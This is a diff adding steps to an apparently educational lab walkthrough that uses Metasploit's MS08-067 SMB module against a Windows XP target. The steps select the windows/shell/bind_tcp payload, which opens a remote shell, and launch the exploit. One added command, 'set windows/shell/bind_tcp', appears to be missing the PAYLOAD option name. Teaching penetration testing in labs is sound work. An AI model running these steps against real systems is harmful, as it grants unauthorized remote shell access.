@@ -43,4 +43,18 @@ use windows/smb/ms08_067_netapi
 ```
 set RHOST WinXP-IP
 ```
-4. Type `show options`
+4. Type `show options` to view the RHOST set
+5. To check which payloads can be used for a certain exploit, type the following command:
+```
+show payloads
+```
+6. View info on the payload `windows/shell/bind_tcp` and set it:
+```
+info windows/shell/bind_tcp
+set windows/shell/bind_tcp
+```
+7. Type `show options` to view the options set for the payload
+8. Run the exploit:
+```
+exploit
+```
